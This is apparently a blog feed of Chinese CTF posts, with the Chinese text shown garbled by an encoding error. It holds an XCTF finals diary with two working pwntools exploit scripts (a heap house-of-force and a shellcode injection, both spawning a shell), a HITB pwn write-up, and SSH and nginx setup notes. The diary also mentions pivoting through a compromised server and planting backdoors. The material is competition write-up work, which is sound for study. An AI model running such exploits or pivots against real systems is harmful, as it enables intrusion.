Day</h2><p>è¿™ä¸€å¤©æ­£å¼å‚åŠ äº†XCTFå†³èµ›äº†ã€‚<br>ç¬¬ä¸€å¤©æ˜¯Aiè§£é¢˜ï¼Œ</p><p>æˆ‘ä»¬ä»¬çš„ç­–ç•¥æ˜¯ï¼Œä¸ç®¡æ˜¯ä»€ä¹ˆé¢˜ç›®ï¼Œç¬¬ä¸€æ­¥å‘é€è¶…çº§é•¿çš„å­—ç¬¦ä¸²ï¼Œèƒ½crashçš„å…ˆè®©ä»–crashï¼Œ<br>æ‰€ä»¥ç¬¬ä¸€å¤©åˆšå¼€å§‹çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±getåˆ°äº†å…­ä¸ªé¢˜ç›®ã€‚<br>å…¶ä¸­åŸºæœ¬éƒ½æ˜¯æ ˆæº¢å‡ºçš„é¢˜ç›®ã€‚</p><p>ç”±äºæ˜¯Aièµ›åˆ¶æ˜¯Aiå…ˆcrashé¢˜ç›®ä¹‹åæˆ‘ä»¬æ‰èƒ½æ‹¿åˆ°binæ–‡ä»¶ï¼ˆæ­£å¸¸æ˜¯è¿™æ ·ï¼Œä½†æ˜¯ã€‚ã€‚ã€‚HHHï¼‰ï¼Œ</p><h3 id="sof"><a href="#sof" class="headerlink" title="sof"></a>sof</h3><p>æ ˆæº¢å‡ºé¢˜ç›®å¾ˆç®€å•</p><h3 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h3><p>æœ‰ä¸¤ä¸ªæ¼æ´ï¼Œä¸€ä¸ªæ˜¯fmtï¼Œä¸€ä¸ªæ˜¯æ ˆæº¢å‡ºï¼Œfmtçš„pritnfä¸¤ä¸ªå‚æ•°æˆ‘ä»¬éƒ½å¯ä»¥æ§åˆ¶ï¼Œå°±æ˜¯ç”±äºè¿™ä¸ªåŸå› ï¼Œæˆ‘ä»¬åˆšå¼€å§‹å°±ä¸€ç›´åœ¨gang æ ¼å¼åŒ–ä¼ è¿™ä¸ªç‚¹ï¼Œè€Œå¿½ç•¥äº†æ ˆæº¢å‡ºã€‚ã€‚</p><p>æœ€åè¿˜æ˜¯ç”¨æ ˆæº¢å‡ºè§£å†³äº†é¢˜ç›®</p><h3 id="packegt"><a href="#packegt" class="headerlink" title="packegt"></a>packegt</h3><p>ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯house of force</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#env = &#123;&#x27;LD_PRELOAD&#x27;:&#x27;libc.so.6&#x27;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">&#x27;./packet&#x27;</span>)<span class="comment">#,env=env)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;10.0.14.1&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">puts_got = <span class="number">0x0000000000601018</span></span><br><span class="line">shellcode = <span class="string">&quot;\x90&quot;</span>*<span class="number">8</span></span><br><span class="line"><span class="comment">#shellcode +=&quot;\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&quot;</span></span><br><span class="line">shellcode += asm(shellcraft.amd64.linux.sh())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ope</span>(<span class="params">size,string=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    pl = <span class="string">&quot;td&quot;</span></span><br><span class="line">    pl += str(size)</span><br><span class="line">    pl += string</span><br><span class="line">    p.send(pl)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    breakpoint = [0x40096d]</span></span><br><span class="line"><span class="string">    bp = &quot;&quot;.join([&quot;b *%d\n&quot;%b for b in breakpoint])</span></span><br><span class="line"><span class="string">    gdb.attach(proc.pidof(p)[0],bp)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    p.readline()</span><br><span class="line">    p.sendline(<span class="string">&quot;gpRGF622u64jnH6rlgoLgpqGQCjZL42c&quot;</span>)</span><br><span class="line">    ope(<span class="number">0</span>,<span class="string">&quot;\xff&quot;</span>*<span class="number">0x25</span> + shellcode)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    rev = p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    sc_addr = int(rev[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&quot;sc:&#123;0&#125;&quot;</span>.format(hex(sc_addr)))</span><br><span class="line">    <span class="comment">#heap_addr = int(ope(9,&quot;\xff&quot; * 0x100),16)</span></span><br><span class="line">    <span class="comment">#log.info(&quot;heap:&#123;0&#125;&quot;.format(heap_addr))</span></span><br><span class="line">    size = (puts_got - sc_addr - <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">    ope(size)</span><br><span class="line">    ope(<span class="number">0</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">5</span>+ p64(<span class="number">0</span>) + p64(sc_addr+<span class="number">0x30</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>åˆ°äº†ä¸‹åˆ<br>æˆ‘ä»¬åˆ°Aiä¸€ç›´æ²¡æœ‰åŠç‚¹åŠ¨é™äº†ï¼Œä¸€ç›´æ²¡æœ‰æ–°é¢˜å‡ºæ¥ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥é€‰æ‹©åˆ°é¢˜ç›®å¤ªå°‘ï¼Œä¸€ç›´åƒµæŒåœ¨åªæœ‰å…­é¢˜åˆ°æƒ…å†µä¸‹ã€‚<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-challenge-list.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-challenge-list.jpg"></a></p><p>ä½†æ˜¯è¿™ä¸ªæ—¶å€™æˆ‘ä»¬åˆ°burneggè›‹æ€»åœ¨æ—©ä¸Šåˆ°æ—¶å€™å·²ç»æŠŠAiåˆ°é¢˜ç›®å…¨éƒ¨è„±äº†ä¸‹æ¥äº†ï¼Œä¸€å…±20ä¸ªä¸€ä¸ªä¸å°‘ï¼Œäºæ˜¯æˆ‘æ¢äº†ä¸€ä¸ªç­–ç•¥ï¼Œå†³å®šäººå·¥å®¡é¢˜ï¼Œç„¶åä¸Šå»ã€‚ã€‚ã€‚é‚£ä¸ªå•¥ã€‚ã€‚ã€‚</p><p>äºæ˜¯åé¢æˆ‘ä»¬åˆgetäº† sof2 å’Œ pointguardä¸¤ä¸ªé¢˜åˆ°crash<br>ä½†æ˜¯è¿™ä¸ªæ—¶å€™ä¸»åŠæ–¹æ¥äº†ï¼Œå‘Šè¯‰æˆ‘ä»¬ä¸Šå»åˆ°æ¬¡æ•°å¤ªå¤šäº†ï¼Œä¸å…è®¸å†è®©æˆ‘ä»¬ä¸Šå»äº†ã€‚ã€‚äºæ˜¯æˆ‘ä»¬å‡†å¤‡è®©è›‹æ€»æ¥ä»¥pwné¢˜ç›®çš„æœåŠ¡å™¨æœ€ä¸ºè·³æ¿ï¼Œç„¶åå»è®¿é—®AiæœåŠ¡å™¨ï¼Œè¿™æ¬¡æˆ‘ä»¬è‡ªå·±æ‰‹åŠ¨crash</p><p>ç„¶åã€‚ã€‚ã€‚è›‹æ€»ä»¥æˆ‘ä»¬å·²ç»Pwnçš„é¢˜ç›®çš„æœåŠ¡å™¨çš„ä¸€ä¸ªç¨³å®šshellå»è®¿é—®äº†AiæœåŠ¡å™¨ï¼Œ<br>æœ€åç¬¬ä¸€å¤©æ¯”èµ›ç»“æŸæ—¶å€™ï¼Œæˆ‘ä»¬åˆ°äº†ç¬¬å››åˆ°åæ¬¡</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01-scordboard.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01-scordboard.jpg"></a></p><p>ä¸‹åˆè§£å‡ºæ¥åˆ°é¢˜ç›®</p><h3 id="sof2"><a href="#sof2" class="headerlink" title="sof2"></a>sof2</h3><p>æ ˆæº¢å‡º</p><h3 id="mp3info"><a href="#mp3info" class="headerlink" title="mp3info"></a>mp3info</h3><p>ä»¥åŠåæ§½ä¸€ä¸‹é”™è¿‡äº†ä¸€ä¸ªä¸Šåˆ†åˆ°æœºä¼šï¼Œpointguardç‰¹ä¹ˆå¤ªç®€å•äº†ï¼Œåº”è¯¥å…ˆå†™expçš„ï¼Œç„¶åå†å»crashå…¶ä»–é¢˜ç›®</p><h2 id="Third-Day"><a href="#Third-Day" class="headerlink" title="Third Day"></a>Third Day</h2><p>ç¬¬ä¸‰å¤©ï¼Œæ”»é˜²èµ›</p><p>å››ä¸ªé¢˜ç›®ï¼Œä»¥ç¬¬å‰ä¸€å¤©çš„pointguardä»¥åŠapatchå’Œä¸¤ä¸ªæœªæ”¾å‡ºçš„æ–°é¢˜,æˆ‘ä»¬å¯çˆ±çš„è›‹æ€»åŒå­¦ï¼Œç”±äºå·²ç»é€ƒäº†ä¸¤å¤©è¯¾äº†ï¼Œæƒ³åˆ°ä»Šå¤©æ²¡æœ‰webå°±è·‘å›å­¦æ ¡äº†â€¦.äºæ˜¯æˆ‘ä»¬å°±æˆäº†ä¸‰äººç»„ é“äººä¸‰é¡¹å‚èµ›è€…ï½</p><h3 id="pointguard"><a href="#pointguard" class="headerlink" title="pointguard"></a>pointguard</h3><p>ä»»æ„åœ°å€å†™ä»¥åŠæ ¼å¼åŒ–ä¼ æ¼æ´<br>è¿™ä¸ªé¢˜ç›®è§„åˆ™ä¸å…è®¸æˆ‘ä»¬è¿›è¡Œpatch åªèƒ½é€šè¿‡backlistè¿›è¡Œæ‹’ç»è®¿é—®çš„åœ°å€ï¼Œå¯¼è‡´è¿™ä¸ªé¢˜ç›®ã€‚ã€‚ã€‚åŸºæœ¬æ²¡æœ‰äººé˜²æˆåŠŸ</p><p>æˆ‘ä»¬å½“å¤©å®Œæˆäº†ä¸‰ä¸ªåˆ©ç”¨ 1.system 2.rop. 3.one gadget</p><h3 id="apatch"><a href="#apatch" class="headerlink" title="apatch"></a>apatch</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.word_size = <span class="number">64</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;apatch&quot;</span>)</span><br><span class="line">pro = process(<span class="string">&quot;./apatch&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">gdb.attach(pro)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.amd64.linux.sh()</span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">payload = p32(<span class="number">0xdeadfafa</span>) + p8(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x3eeb</span>) + p32(<span class="number">1</span>) + p32(len(shellcode))</span><br><span class="line">payload += shellcode</span><br><span class="line">pause()</span><br><span class="line">pro.write(payload)</span><br><span class="line">d = pro.read(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> ord(d) == <span class="number">0xcc</span></span><br><span class="line">tmp = pro.read(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">print</span> tmp</span><br><span class="line">index = u32(tmp)</span><br><span class="line"><span class="keyword">print</span> hex(index)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0xdeadfafa</span>) + p8((<span class="number">0x2030a0</span> - <span class="number">0x203020</span>)/<span class="number">8</span>)</span><br><span class="line">pause()</span><br><span class="line">pro.write(payload)</span><br><span class="line">pro.interactive()</span><br></pre></td></tr></table></figure><p>åˆšå¼€å§‹çš„åˆ†å·¥æ˜¯ï¼Œmuheå†™black listçš„patchï¼Œé€šè¿‡æµé‡å®¡ï¼Œæ·»åŠ åˆ°blacklistä¸­ï¼Œç„¶åflierè¿›è¡Œæ–°expï¼Œæˆ‘è¿›è¡Œè¿ç»´ï¼Œä»¥åŠåé—¨çš„æ·»åŠ ã€‚ã€‚ã€‚</p><p>ç„¶è€Œï¼Œæµé‡å®¡æŸ¥ä¸­å‡ºç°äº†åº”è¯¥whiresharkæ‰“ä¸å¼€æµé‡åŒ…çš„å°´å°¬ã€‚ã€‚ã€‚</p><p>ä»¥åŠåé—¨æ·»åŠ ä¸è¿›å»çš„å°´å°¬ã€‚ã€‚ã€‚äºæ˜¯æˆ‘ä»¬åªèƒ½æ‰‹åŠ¨ä¿æŒsshçš„å­˜åœ¨ ç»´æŒæƒé™ï¼Œä¸ä¼šä»¥è‡³äºå¯¹æ‰‹patchæ–‡ä»¶åæˆ‘ä»¬ä¸èƒ½get flagäº†</p><p>ã€‚ã€‚ã€‚ä½†æ˜¯windowsç”¨å¤šäº†ã€‚ã€‚ã€‚æˆ‘ä¸å°å¿ƒå…³äº†äº”ä¸ªã€‚ã€‚ã€‚ï¼binï¼shå‰©ä¸‰ä¸ªã€‚ã€‚ã€‚</p><p>è¿ç»´çš„æ—¶å€™ï¼Œï¼Œï¼Œæˆ‘ä¹Ÿå‡ºäº†ä¸€ç‚¹å°´å°¬ï¼Œï¼Œï¼Œå‘ç°åé—¨çš„æ—¶é—´å¤ªæ™šäº†ã€‚ã€‚ã€‚</p><p>æ‰€ä»¥ï¼Œï¼Œï¼Œç¬¬äºŒå¤©æˆ‘ä»¬å…¨ç¨‹æ˜¯åœ¨é˜²å®ˆï¼Œæ— æš‡å»å°è¯•æµé‡é‡æ”¾ä»¥åŠå»å†™æ–°çš„expå»æ”»å‡»å¯¹æ‰‹</p><p>æ‰€ä»¥Good Gameï¼<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01-scordboard.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-xctf-final-01-scordboard.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017 HITB CTF  æ–°åŠ å¡ Pwn Writeup</title>
      <link href="2017-HITB-CTF-Pwn.html"/>
      <url>2017-HITB-CTF-Pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h2><p>è¿™æ˜¯ä¸€ä¸ªèœå•ç¨‹åºã€‚<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-01.jpg"></a><br>å…¶æœ‰ä¸‰ä¸ªä¸»è¦åŠŸèƒ½</p><h3 id="åŠŸèƒ½ä¸€-go"><a href="#åŠŸèƒ½ä¸€-go" class="headerlink" title="åŠŸèƒ½ä¸€ go"></a>åŠŸèƒ½ä¸€ go</h3><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitc-pwn-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitc-pwn-02.jpg"></a></p><p>é¦–å…ˆï¼Œå…¶ä¼šè¯¢é—®ä½ è¦æŒ‘æˆ˜çš„æ€»å…³å¡<br>ä¹‹åä¼šå†ä¸€æ¬¡è¯¢é—®ï¼Œæ˜¯å¦è¦å¢åŠ å…³å¡</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitbctf-pwn-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitbctf-pwn-03.jpg"></a></p><p>æœ‰ä¸€ä¸ªåœ°æ–¹å€¼å¾—æ³¨æ„ï¼Œå¦‚æœæˆ‘ä»¬åœ¨è¯¢é—®levelçš„æ—¶å€™ è¾“å…¥ è´Ÿæ•°ï¼Œé‚£ä¹ˆç¨‹åºå°†æ‰“å°å‡ºCowardï¼Œç„¶åç»§ç»­è¯¢é—®å› æ­¤ï¼Œè¿™ä¸€æ¬¡æ— è®ºå¤§å°ï¼ŒAny moreåè¾“å…¥çš„å€¼éƒ½å°†ç›´æ¥åŠ åœ¨v5ä¸Šï¼Œ ç„¶è€Œç°åœ¨çš„v5è¿˜æ²¡æœ‰è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p>ä»¥åŠï¼Œç¬¬äºŒæ¬¡è¯¢é—®çš„æ—¶å€™æ²¡æœ‰åˆ¤æ–­æ˜¯å¦å°äº0.<br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ° level å‡½æ•° å¦‚å›¾</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-04.jpg"></a></p><p>å¾€buf è¯»å…¥äº†0x400çš„æ•°æ®ï¼Œæœ‰ä¸€ä¸ªæ˜æ˜¾çš„æ ˆæº¢å‡ºã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-05.jpg"></a></p><p>æ£€æŸ¥ä¸€ä¸‹ç¨‹åºå¼€å¯çš„ä¿æŠ¤ã€‚</p><h3 id="åŠŸèƒ½äºŒ-Hint"><a href="#åŠŸèƒ½äºŒ-Hint" class="headerlink" title="åŠŸèƒ½äºŒ Hint"></a>åŠŸèƒ½äºŒ Hint</h3><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-06.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-06.jpg"></a></p><p>ä»æ±‡ç¼–ä»£ç ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå½“æ‰§è¡Œ hintåï¼Œæ— è®ºåœ¨å“ªä¸ªåˆ†æ”¯ä¸Šï¼Œsystemå‡½æ•°åœ°å€éƒ½è¢«æ”¾åˆ°äº†æ ˆä¸Šã€‚</p><h3 id="åŠŸèƒ½ä¸‰-give-up"><a href="#åŠŸèƒ½ä¸‰-give-up" class="headerlink" title="åŠŸèƒ½ä¸‰ give up"></a>åŠŸèƒ½ä¸‰ give up</h3><p>é€€å‡ºç¨‹åºï¼Œ</p><h2 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><p>æˆ‘ä»¬åœ¨è°ƒè¯•çš„æ—¶å€™ä¼šå‘ç°ï¼Œæœªåˆå§‹åŒ–çš„v5 å’Œ systemçš„åœ°å€å¤ç”¨äº†ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬å·²ç»å¾—åˆ°äº†ä¸€ä¸ªåœ°å€ï¼Œä½†æ˜¯ç”±äºå¼€å¯äº†pieï¼Œæˆ‘ä»¬è¿˜æ˜¯ä¸ä¸èƒ½å®Œå…¨çš„æ§åˆ¶è¿™ä¸ªåœ°å€å»getshellã€‚</p><p>é¢˜ç›®ç»™äº†libc  é‚£ä¹ˆæˆ‘æ˜¯å¦èƒ½åˆ©ç”¨libcï¼Ÿ<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-07.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-07.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-08.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-08.jpg"></a></p><p>åœ¨libcä¸­ï¼Œæˆ‘ä»¬å‘ç°ï¼Œsystemçš„åœ°å€å’Œone gadget rce çš„åœ°å€ ç›¸å·®0x4526a-0x45390</p><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬å¯¹é‚£ä¸ªæœªåˆå§‹åŒ–çš„å‚æ•°è¿›è¡Œå‡æ³•è¿ç®—æœ€åæ˜¯ä¸æ˜¯å°±è€Œå·²è°ƒç”¨åˆ°one gadget rceäº†å‘¢ï¼Ÿ</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥çš„å¦å¤–ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯å¦‚ä½•æ§åˆ¶eipï¼Œè·³è½¬åˆ°è¿™ä¸ªå‚æ•°åœ°å€äº†</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-09.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-09.jpg"></a></p><p>vmmpä¸­å­˜åœ¨ vsyscall</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-10.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-hitb-pwn-10.jpg"></a></p><p>æ„é€ ä¸€ä¸ªret ropé“¾ï¼Œä¸æ–­çš„å»æ¥è¿‘ç›®æ ‡åœ°å€å³å¯ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> HITB CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Rankè¿ç»´æ—¥è®°  ï¼ˆäºŒï¼‰</title>
      <link href="How-to-add-ssh-key.html"/>
      <url>How-to-add-ssh-key.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="ç¬¬ä¸€æ­¥ï¼š"><a href="#ç¬¬ä¸€æ­¥ï¼š" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼š"></a>ç¬¬ä¸€æ­¥ï¼š</h2><p>å®¢æˆ·æœº ç”Ÿæˆå…¬é’¥<br>        <code>ssh-keygen -t rsa</code></p><h2 id="ç¬¬äºŒæ­¥ï¼š"><a href="#ç¬¬äºŒæ­¥ï¼š" class="headerlink" title="ç¬¬äºŒæ­¥ï¼š"></a>ç¬¬äºŒæ­¥ï¼š</h2><p>å°†å…¬é’¥ä¼ åˆ°æœåŠ¡å™¨<br><code>scp id_rsa.pub root@ip:/root/.ssh/</code><br>    å°†å…¬é’¥å¯¼å…¥keysæ–‡ä»¶<br><code>cat /root/.ssh/id_rsa.pub &gt;&gt; /root/.ssh/authorized_keys</code></p><h2 id="ç¬¬ä¸‰æ­¥ï¼š"><a href="#ç¬¬ä¸‰æ­¥ï¼š" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼š"></a>ç¬¬ä¸‰æ­¥ï¼š</h2><p>ä¿®æ”¹sshé…ç½®æ–‡ä»¶<br>        <code>Vim /etc/ssh/sshd_config</code></p><p><a href="http://oayoilchh.bkt.clouddn.com/17-8-16/92667768.jpg" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/17-8-16/92667768.jpg"></a></p><h2 id="ç¬¬å››æ­¥ï¼š"><a href="#ç¬¬å››æ­¥ï¼š" class="headerlink" title="ç¬¬å››æ­¥ï¼š"></a>ç¬¬å››æ­¥ï¼š</h2><p>é‡å¯æœåŠ¡<br>    <code>service sshd restart</code></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Rankè¿ç»´æ—¥è®°  ï¼ˆä¸€ï¼‰</title>
      <link href="Nginx-How-to-install-ssl.html"/>
      <url>Nginx-How-to-install-ssl.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>é»˜è®¤æƒ…å†µä¸‹sslæ¨¡å—å¹¶æœªè¢«å®‰è£…ï¼Œå¦‚æœè¦ä½¿ç”¨è¯¥æ¨¡å—åˆ™éœ€è¦åœ¨ç¼–è¯‘æ—¶æŒ‡å®šâ€“with-http_ssl_moduleå‚æ•°ï¼Œå®‰è£…æ¨¡å—ä¾èµ–äºOpenSSLåº“å’Œä¸€äº›å¼•ç”¨æ–‡ä»¶ï¼Œé€šå¸¸è¿™äº›æ–‡ä»¶å¹¶ä¸åœ¨åŒä¸€ä¸ªè½¯ä»¶åŒ…ä¸­ã€‚é€šå¸¸è¿™ä¸ªæ–‡ä»¶åç±»ä¼¼libssl-devã€‚</p><p>ç”Ÿæˆè¯ä¹¦</p><p>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤ç”Ÿæˆä¸€ä¸ªç®€å•çš„è¯ä¹¦ï¼š<br>é¦–å…ˆï¼Œè¿›å…¥ä½ æƒ³åˆ›å»ºè¯ä¹¦å’Œç§é’¥çš„ç›®å½•ï¼Œä¾‹å¦‚ï¼š</p><p>$ cd /usr/local/nginx/conf<br>åˆ›å»ºæœåŠ¡å™¨ç§é’¥ï¼Œå‘½ä»¤ä¼šè®©ä½ è¾“å…¥ä¸€ä¸ªå£ä»¤ï¼š</p><p>$ openssl genrsa -des3 -out server.key 1024<br>åˆ›å»ºç­¾åè¯·æ±‚çš„è¯ä¹¦ï¼ˆCSRï¼‰ï¼š</p><p>$ openssl req -new -key server.key -out server.csr<br>åœ¨åŠ 